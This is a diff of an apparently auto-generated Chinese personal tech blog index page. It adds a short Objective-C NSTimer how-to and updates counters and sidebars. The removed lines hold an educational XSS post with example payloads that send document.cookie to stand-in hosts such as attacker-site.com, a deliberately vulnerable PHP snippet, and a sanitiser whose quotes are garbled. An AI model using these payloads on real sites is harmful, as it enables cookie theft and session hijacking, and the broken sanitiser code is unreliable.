@@ -93,11 +93,11 @@
     </div>
     <div class="article-info profile-block">
       <div class="article-info-block">
-        31
+        32
         <span>文章</span>
       </div>
       <div class="article-info-block">
-        45
+        46
         <span>标签</span>
       </div>
     </div>
@@ -124,6 +124,62 @@
 
       
       <section id="main">
+      <article id="post-怎么使用NSTimer" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/08/10/怎么使用NSTimer/">怎么使用NSTimer</a>
+    </h1>
+  
+
+        <div class="article-meta">
+          
+  <div class="article-date">
+    <i class="fa fa-calendar"></i>
+    <a href="/2015/08/10/怎么使用NSTimer/">
+      <time datetime="2015-08-10T13:08:50.000Z" itemprop="datePublished">2015-08-10</time>
+    </a>
+  </div>
+
+
+          
+  <div class="article-category">
+  	<i class="fa fa-folder"></i>
+    <a class="article-category-link" href="/categories/ios学习笔记/">ios学习笔记</a>
+  </div>
+
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>今天在做demo的时候需要用到定时器，这里简要记录一下</p>
+<p>1、先定义一个timer<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSTimer</span> *hqTimer = [<span class="built_in">NSTimer</span> scheduledTimerWithTimeInterval:<span class="number">5.0</span></span><br><span class="line">                                                        target:<span class="keyword">self</span></span><br><span class="line">							selector:<span class="keyword">@selector</span>(refreshHq:) </span><br><span class="line">							userInfo:<span class="literal">nil</span> repeats:<span class="literal">YES</span>];</span><br></pre></td></tr></table></figure></p>
+<p>以上定义一个timer,5.0表示每5秒执行一次，<code>repeats:YES</code>表示重复执行，如果为NO执行一次就失效，<code>refreshHq:</code>表示要调用的方法，将在下面定义<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="keyword">void</span>)refreshHq:(<span class="built_in">NSTimer</span> *)theTimer &#123;</span><br><span class="line">	<span class="built_in">NSLog</span>(<span class="string">@"fsdafsf"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://minishine.com/2015/08/10/怎么使用NSTimer/" data-id="cidir8131000kb33njznkq1mq" class="article-share-link">分享到</a>
+      
+        <a href="http://minishine.com/2015/08/10/怎么使用NSTimer/#ds-thread" class="article-comment-link">评论</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ios/">ios</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/timer/">timer</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+    
       <article id="post-总结一下" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -166,7 +222,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://minishine.com/2015/08/07/总结一下/" data-id="cidh2nln2000iy13nfmxs9bz6" class="article-share-link">分享到</a>
+      <a data-url="http://minishine.com/2015/08/07/总结一下/" data-id="cidir812w000ib33nfrv5m2oj" class="article-share-link">分享到</a>
       
         <a href="http://minishine.com/2015/08/07/总结一下/#ds-thread" class="article-comment-link">评论</a>
       
@@ -234,7 +290,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://minishine.com/2015/08/03/redis编译安装杂记/" data-id="cidh2nlok002hy13n1cmmwgsk" class="article-share-link">分享到</a>
+      <a data-url="http://minishine.com/2015/08/03/redis编译安装杂记/" data-id="cidir817f002hb33n662k2n7k" class="article-share-link">分享到</a>
       
         <a href="http://minishine.com/2015/08/03/redis编译安装杂记/#ds-thread" class="article-comment-link">评论</a>
       
@@ -290,7 +346,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://minishine.com/2015/08/03/什么是资源类型变量/" data-id="cidh2nlns001cy13n51n675m4" class="article-share-link">分享到</a>
+      <a data-url="http://minishine.com/2015/08/03/什么是资源类型变量/" data-id="cidir814u001cb33ncyev7ofn" class="article-share-link">分享到</a>
       
         <a href="http://minishine.com/2015/08/03/什么是资源类型变量/#ds-thread" class="article-comment-link">评论</a>
       
@@ -343,7 +399,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://minishine.com/2015/08/03/fiddler抓手机软件发的包/" data-id="cidh2nlps003ky13n55by30j4" class="article-share-link">分享到</a>
+      <a data-url="http://minishine.com/2015/08/03/fiddler抓手机软件发的包/" data-id="cidir819t003pb33n7hjvfqsh" class="article-share-link">分享到</a>
       
         <a href="http://minishine.com/2015/08/03/fiddler抓手机软件发的包/#ds-thread" class="article-comment-link">评论</a>
       
@@ -402,73 +458,12 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://minishine.com/2015/08/03/MySQL最佳实践培训后测试——参考答案/" data-id="cidh2nlq90043y13nbqck1xyd" class="article-share-link">分享到</a>
+      <a data-url="http://minishine.com/2015/08/03/MySQL最佳实践培训后测试——参考答案/" data-id="cidir81ac0048b33nqxz55e1e" class="article-share-link">分享到</a>
       
         <a href="http://minishine.com/2015/08/03/MySQL最佳实践培训后测试——参考答案/#ds-thread" class="article-comment-link">评论</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Mysql/">Mysql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/测试/">测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-    
-      <article id="post-XSS攻击相关" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/08/03/XSS攻击相关/">XSS攻击相关</a>
-    </h1>
-  
-
-        <div class="article-meta">
-          
-  <div class="article-date">
-    <i class="fa fa-calendar"></i>
-    <a href="/2015/08/03/XSS攻击相关/">
-      <time datetime="2015-08-03T03:56:03.000Z" itemprop="datePublished">2015-08-03</time>
-    </a>
-  </div>
-
-
-          
-  <div class="article-category">
-  	<i class="fa fa-folder"></i>
-    <a class="article-category-link" href="/categories/security/">security</a>
-  </div>
-
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>面试的时候好几次被问到，居然没有去总结一下，罪过！<br>XSS攻击：跨站脚本攻击(Cross Site Scripting)，为了不和CSS重名，故写作XSS</p>
-<h4 id="常见XSS攻击">常见XSS攻击</h4><h5 id="1、存储式XSS攻击">1、存储式XSS攻击</h5><h6 id="a、嵌入JS脚本，实现对用户浏览器的控制">a、嵌入JS脚本，实现对用户浏览器的控制</h6><p>攻击者在提交的数据里面插入一断JS，比如<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">#</span> <span class="attribute">onclick</span>=<span class="value">”document.location=’http:</span>//<span class="attribute">attacker-site.com</span>/<span class="attribute">xss.php</span>?<span class="attribute">c</span>=<span class="value">’+escape(document.cookie);”</span>&gt;</span>戳我呀<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>该数据如果不经过过滤直接保存到数据据中，再放出来的时候会被浏览器渲染，不知情的用户点击 “戳我呀” 那么立刻就会执行这段JS，上述的js会直接将用户的cookie发送给攻击者。</p>
-<h6 id="b、嵌入html标签">b、嵌入html标签</h6><p>这个最简单易见，直接把页面的结构搞乱, 或者有这么一段  <meta http-equiv="”refresh”" content="”0;”">  那页面就会不停的刷新。</p>
-<h5 id="2、非存储式XSS攻击">2、非存储式XSS攻击</h5><p>比如站点有这样的一个页面  <a href="http://www.aaa.com/index.php，" target="_blank" rel="external">http://www.aaa.com/index.php，</a> index.php里面的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">'name'</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"welcome  "</span>, <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure></p>
-<p>显然，代码里面没有对用户GET过来的数据进行过滤，此时攻击者如果伪造一个链接 如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aaa.com/index.php?name=<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="stylus">window.<span class="function"><span class="title">open</span><span class="params">(“www.b.com?param=”+document.cookie)</span></span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>并把它发给一个无辜的用户，如果此时这个用户正好是登录aaa.com 这个站点的时候，那悲剧了，它的cookie将会被攻击者盗走，自己却全然不知。</p>
-<h5 id="q:怎么防御？a:永远不要相信用户发来的数据，严格过滤">q:怎么防御？a:永远不要相信用户发来的数据，严格过滤</h5><p>附上一段代码，以后作为参考！<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean_xss</span><span class="params">(&amp;<span class="variable">$string</span>, <span class="variable">$low</span> = False)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! is_array ( <span class="variable">$string</span> )) &#123;</span><br><span class="line"><span class="variable">$string</span> = trim ( <span class="variable">$string</span> );</span><br><span class="line"><span class="variable">$string</span> = strip_tags ( <span class="variable">$string</span> );</span><br><span class="line"><span class="variable">$string</span> = htmlspecialchars ( <span class="variable">$string</span> );</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$low</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$string</span> = str_replace ( <span class="keyword">array</span> (‘”‘, “\”, “‘”, “/”, “..”, “../”, “./”, “<span class="comment">//” ), ”, $string );</span></span><br><span class="line"><span class="variable">$no</span> = ‘/%<span class="number">0</span>[<span class="number">0</span>-<span class="number">8</span>bcef]/’;</span><br><span class="line"><span class="variable">$string</span> = preg_replace ( <span class="variable">$no</span>, ”, <span class="variable">$string</span> );</span><br><span class="line"><span class="variable">$no</span> = ‘/%<span class="number">1</span>[<span class="number">0</span>-<span class="number">9</span>a-f]/’;</span><br><span class="line"><span class="variable">$string</span> = preg_replace ( <span class="variable">$no</span>, ”, <span class="variable">$string</span> );</span><br><span class="line"><span class="variable">$no</span> = ‘/[x00-x08x0Bx0Cx0E-x1Fx7F]+/S’;</span><br><span class="line"><span class="variable">$string</span> = preg_replace ( <span class="variable">$no</span>, ”, <span class="variable">$string</span> );</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$keys</span> = array_keys ( <span class="variable">$string</span> );</span><br><span class="line"><span class="keyword">foreach</span> ( <span class="variable">$keys</span> <span class="keyword">as</span> <span class="variable">$key</span> ) &#123;</span><br><span class="line">clean_xss ( <span class="variable">$string</span> [<span class="variable">$key</span>] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//just a test</span></span><br><span class="line"><span class="variable">$str</span> = ‘phpddt.com&lt;meta http-equiv=”refresh” content=”<span class="number">0</span>;”&gt;’;</span><br><span class="line">clean_xss(<span class="variable">$str</span>); <span class="comment">//如果你把这个注释掉，你就知道xss攻击的厉害了</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://minishine.com/2015/08/03/XSS攻击相关/" data-id="cidh2nlq6003yy13n8jhha7rb" class="article-share-link">分享到</a>
-      
-        <a href="http://minishine.com/2015/08/03/XSS攻击相关/#ds-thread" class="article-comment-link">评论</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
 
     </footer>
   </div>
@@ -489,7 +484,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CGI/" style="font-size: 10px;">CGI</a> <a href="/tags/FastCGI/" style="font-size: 10px;">FastCGI</a> <a href="/tags/Mysql/" style="font-size: 10px;">Mysql</a> <a href="/tags/NERDTree/" style="font-size: 10px;">NERDTree</a> <a href="/tags/PHP-CGI/" style="font-size: 10px;">PHP-CGI</a> <a href="/tags/PHP-FPM/" style="font-size: 10px;">PHP-FPM</a> <a href="/tags/Spawn-FCGI/" style="font-size: 10px;">Spawn-FCGI</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/centos/" style="font-size: 15px;">centos</a> <a href="/tags/fiddler/" style="font-size: 10px;">fiddler</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hgdonline/" style="font-size: 10px;">hgdonline</a> <a href="/tags/ios/" style="font-size: 15px;">ios</a> <a href="/tags/linux/" style="font-size: 20px;">linux</a> <a href="/tags/mac/" style="font-size: 10px;">mac</a> <a href="/tags/memcache/" style="font-size: 10px;">memcache</a> <a href="/tags/mysql/" style="font-size: 15px;">mysql</a> <a href="/tags/nginx/" style="font-size: 20px;">nginx</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/php-fpm/" style="font-size: 10px;">php-fpm</a> <a href="/tags/redis/" style="font-size: 20px;">redis</a> <a href="/tags/session/" style="font-size: 15px;">session</a> <a href="/tags/session-set-save-handler/" style="font-size: 10px;">session_set_save_handler</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/sudo/" style="font-size: 10px;">sudo</a> <a href="/tags/table-view/" style="font-size: 10px;">table view</a> <a href="/tags/timer/" style="font-size: 10px;">timer</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/vim/" style="font-size: 10px;">vim</a> <a href="/tags/vsftp/" style="font-size: 10px;">vsftp</a> <a href="/tags/yum-install/" style="font-size: 10px;">yum install</a> <a href="/tags/亲情/" style="font-size: 10px;">亲情</a> <a href="/tags/人生多艰/" style="font-size: 10px;">人生多艰</a> <a href="/tags/内存管理/" style="font-size: 10px;">内存管理</a> <a href="/tags/命令/" style="font-size: 10px;">命令</a> <a href="/tags/基友/" style="font-size: 10px;">基友</a> <a href="/tags/快捷键/" style="font-size: 10px;">快捷键</a> <a href="/tags/换届合影/" style="font-size: 10px;">换届合影</a> <a href="/tags/无法删除/" style="font-size: 10px;">无法删除</a> <a href="/tags/日历/" style="font-size: 10px;">日历</a> <a href="/tags/权限/" style="font-size: 10px;">权限</a> <a href="/tags/测试/" style="font-size: 10px;">测试</a> <a href="/tags/湖工大在线/" style="font-size: 10px;">湖工大在线</a> <a href="/tags/设计模式/" style="font-size: 10px;">设计模式</a> <a href="/tags/错误日志/" style="font-size: 10px;">错误日志</a>
+      <a href="/tags/CGI/" style="font-size: 10px;">CGI</a> <a href="/tags/FastCGI/" style="font-size: 10px;">FastCGI</a> <a href="/tags/Mysql/" style="font-size: 10px;">Mysql</a> <a href="/tags/NERDTree/" style="font-size: 10px;">NERDTree</a> <a href="/tags/PHP-CGI/" style="font-size: 10px;">PHP-CGI</a> <a href="/tags/PHP-FPM/" style="font-size: 10px;">PHP-FPM</a> <a href="/tags/RESideMenu/" style="font-size: 10px;">RESideMenu</a> <a href="/tags/Spawn-FCGI/" style="font-size: 10px;">Spawn-FCGI</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/centos/" style="font-size: 15px;">centos</a> <a href="/tags/fiddler/" style="font-size: 10px;">fiddler</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hgdonline/" style="font-size: 10px;">hgdonline</a> <a href="/tags/ios/" style="font-size: 20px;">ios</a> <a href="/tags/linux/" style="font-size: 20px;">linux</a> <a href="/tags/mac/" style="font-size: 10px;">mac</a> <a href="/tags/memcache/" style="font-size: 10px;">memcache</a> <a href="/tags/mysql/" style="font-size: 15px;">mysql</a> <a href="/tags/nginx/" style="font-size: 20px;">nginx</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/php-fpm/" style="font-size: 10px;">php-fpm</a> <a href="/tags/redis/" style="font-size: 20px;">redis</a> <a href="/tags/session/" style="font-size: 15px;">session</a> <a href="/tags/session-set-save-handler/" style="font-size: 10px;">session_set_save_handler</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/sudo/" style="font-size: 10px;">sudo</a> <a href="/tags/table-view/" style="font-size: 10px;">table view</a> <a href="/tags/timer/" style="font-size: 10px;">timer</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/vim/" style="font-size: 10px;">vim</a> <a href="/tags/vsftp/" style="font-size: 10px;">vsftp</a> <a href="/tags/yum-install/" style="font-size: 10px;">yum install</a> <a href="/tags/亲情/" style="font-size: 10px;">亲情</a> <a href="/tags/人生多艰/" style="font-size: 10px;">人生多艰</a> <a href="/tags/内存管理/" style="font-size: 10px;">内存管理</a> <a href="/tags/命令/" style="font-size: 10px;">命令</a> <a href="/tags/基友/" style="font-size: 10px;">基友</a> <a href="/tags/快捷键/" style="font-size: 10px;">快捷键</a> <a href="/tags/换届合影/" style="font-size: 10px;">换届合影</a> <a href="/tags/无法删除/" style="font-size: 10px;">无法删除</a> <a href="/tags/日历/" style="font-size: 10px;">日历</a> <a href="/tags/权限/" style="font-size: 10px;">权限</a> <a href="/tags/测试/" style="font-size: 10px;">测试</a> <a href="/tags/湖工大在线/" style="font-size: 10px;">湖工大在线</a> <a href="/tags/设计模式/" style="font-size: 10px;">设计模式</a> <a href="/tags/错误日志/" style="font-size: 10px;">错误日志</a>
     </div>
   </div>
 
@@ -499,6 +494,15 @@
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul id="recent-post" class="no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/ios学习笔记/">ios学习笔记</a></p>
+              <p class="item-title"><a href="/2015/08/19/ios开发RESideMenu实现侧滑功能/" class="title">ios开发RESideMenu实现侧滑功能</a></p>
+              <p class="item-date"><time datetime="2015-08-19T12:19:11.000Z" itemprop="datePublished">2015-08-19</time></p>
+            </div>
+          </li>
         
           <li>
             
@@ -536,15 +540,6 @@
             </div>
           </li>
         
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category"><a class="article-category-link" href="/categories/ios学习笔记/">ios学习笔记</a></p>
-              <p class="item-title"><a href="/2015/08/12/ios开发之table-view的使用/" class="title">ios开发之table view的使用</a></p>
-              <p class="item-date"><time datetime="2015-08-12T12:51:52.000Z" itemprop="datePublished">2015-08-12</time></p>
-            </div>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -554,7 +549,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/">Mysql</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Nginx/">Nginx</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tech-Doc/">Tech Doc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ios学习笔记/">ios学习笔记</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reids/">reids</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂谈/">杂谈</a><span class="category-list-count">4</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/">Mysql</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Nginx/">Nginx</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tech-Doc/">Tech Doc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ios学习笔记/">ios学习笔记</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reids/">reids</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂谈/">杂谈</a><span class="category-list-count">4</span></li></ul>
     </div>
   </div>
 
